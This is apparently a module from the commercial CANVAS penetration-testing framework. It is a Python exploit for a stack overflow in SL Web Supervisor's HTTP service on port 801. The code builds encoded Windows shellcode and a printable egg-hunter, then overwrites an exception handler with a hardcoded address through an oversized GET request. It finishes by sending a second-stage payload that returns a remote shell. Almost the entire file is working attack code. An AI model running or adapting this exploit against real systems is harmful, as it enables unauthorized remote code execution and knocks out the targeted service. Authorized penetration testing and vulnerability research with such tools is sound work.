#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information
TODO="""
"""
import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import chunkedaddencoder
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
import printable #printable encoder

NAME="SL Web Supervisor"
DESCRIPTION="SL Web Supervisor HTTP Subversion Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Avanquest"
DOCUMENTATION["Repeatability"]="This is a one shot exploit. On failure, it is likely the service will die."
DOCUMENTATION["VersionsAffected"]=""
DOCUMENTATION["Patch"]="Patched by ..."
DOCUMENTATION["UseNotes"]="This exploit will pause the GUI for some time while it encodes its shellcode."
DOCUMENTATION["Service"]="BVRP SLMail Supervisor Web Services - it won't go down, so you'll want to use restart on it to get the service back"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
File to attach to is WebContainer. If you actually see this running in the wild,
I would love to know. 
    
Annoying issues with this exploit:
    1. Any non-printable character string is replaced with a single \x20
    2. Any \x20 is deleted
    3. After your shell comes back, it only lasts a little while before something
    causes an exception in another thread. This takes the process down.

    All three of these are solved in the following exploit.
"""

CHANGELOG="""

"""

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

#import curses.ascii


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.port=801
        self.host=""
        self.shellcode="\xcc" * 298
        self.searchbadstring= "\x00\\/.:?\r\n%?\" "
        self.badstring= "\x00\\/.:?\r\n%?\" "
        self.ssl=0
        self.setVersions()
        self.version=1
        self.tag1 = "ABBA"
        self.tag2 = "BAAB"
        self.stagetwo = ""
        self.done = 0
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, geteip (must be printable ascii!)
        #ebx is pointing to us on windows 2000 SP4
        self.versions[1]=("DataServ 0x3159223c",0x3159223c)


    def neededListenerTypes(self):
        return []
    
    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        #sc.addAttr("revert_to_self_before_importing_ws2_32",None)
        sc.addAttr("unhandled_exception_filter",None)
        #sc.addAttr("debugme", None)
        sc.addAttr("GOFindSock", None)
        sc.addAttr("RecvExecWin32", None)    
        #sc.addAttr("LoadRegAsFD", {"reg" : "esi"})
        #sc.addAttr("tcpconnect",{"port":localport,"ipaddress":localhost})
        #sc.addAttr("initstackswap",None)
        #sc.addAttr("stackSwap",None)
        raw=sc.get()
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        #tag it for the searcher
        self.shellcode= "AAAAAAAA\xeb\x08" + self.tag2+self.tag1+encoder.encode(raw)
        
        #now do search shellcode
        raw=win32shell.getsearchcode(self.tag1,self.tag2)
        self.log("Doing printable encoding - takes some time...")
        encoder=printable.intelprintableencoder()
        encoder.setESPMod(3700) #put this large enough that esp points at least 200
        #bytes below your shellcode
        encoder.setbadchars(self.searchbadstring)
        data=encoder.encode(raw)
        self.encodedsearchcode=data
        #print "%d: length=%d (from %d) Data=%s"%(isprint(data),len(data),len(raw),data)
        self.log("Done with printable encoding")
        return
    
    def createStageTwoShellcode(self):
        s2sc = shellcodeGenerator.win32()
        # our fd is in esi
        # save the register before the import loops
        s2sc.addAttr("findeip", {"savereg" : "esi"})
        # restore the register and load it to FDSPOT
        # which is used by initstackswap and stackswap
        s2sc.addAttr("LoadSavedRegAsFD", { "reg" : "esi" })
        self.log("Creating stage two payload")
        s2sc.addAttr("initstackswap", None)
        s2sc.addAttr("stackSwap", None)
        self.stagetwo = s2sc.get()
        if self.stagetwo == "":
            self.log("Problem building stage two payload")
            return 0
        return self.stagetwo
    
    def test(self):
        """
        
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        self.websend(s,"HEAD / HTTP/1.0\r\n\r\n")
        data=self.webrecv(s)
        self.log("Returned: %s"%data)
        if data.count("OctoWebSvr/COM"):
            return 1
        return 0
    
    def putshellcode(self):
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = self.gettcpsock()

        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        shellcode=self.shellcode
        sploitstring="GET / HTTP/1.0\r\nshellcode: %s\r\n"%shellcode
        self.websend(s,sploitstring)
        #data=self.webrecv(s)
        self.savedsock=s
        return
        
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        if self.version==0:
            self.log("Automatic versioning not enabled.")
            self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
            self.setState("done")
            return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        self.putshellcode()
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            self.setState("done")
            return 0
        
        #when the socket closes, the cleanup code will kill our thread
        canvasengine.socket_save_list.append(s)
        canvasengine.socket_save_list.append(self.savedsock)
        
        sploitstring=self.makesploit()
        self.websend(s,sploitstring)
        
        if self.checkTriggerWin32(s):
            self.log("Setting success flag")
            self.setSucceeded()
            time.sleep(1)
            # load 2nd stage shellcode
            stagetwo = self.createStageTwoShellcode()
            self.log("Sending 2nd stage payload (%d bytes)"% len(stagetwo))
            s.send(intel_order(len(stagetwo)))
            self.websend(s, stagetwo)
            shell = self.doGOproxyWin32(s)
            self.done = 1
        else:
            self.log("Did not find trigger.")
            
        if self.ISucceeded() or self.done:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return shell
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
    def makesploit(self):
        """
        Construct the attack
        returns a tuple of 3 strings
        
        One return address is at 152, but that gets corrupted.
        
        They basically want an all ascii-printable string, which is a huge pain
        
        Note that a lot of other things will cause a harmless floating point
        exception.
        
        """
        ret="\x41"*5000
        #ret=""
        #ret=stroverwrite(ret,"B"*20,140)
        geteip=self.versions[self.version][1]
        self.log("Geteip=0x%8.8x"%geteip)
        #eiploc=148 #for return address
        eiploc=132 #for exception handler
        shellloc=500 
        ret=stroverwrite(ret,intel_order(geteip),eiploc)
        #this jumps over the 4 bytes of our address
        ret=stroverwrite(ret,"-",eiploc-1)
        ret=stroverwrite(ret,self.encodedsearchcode,shellloc)
        ret="GET /auto_logon.mmr HTTP/1.1%s\r\nHost: localhost\r\n\r\n"%ret
        return ret
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
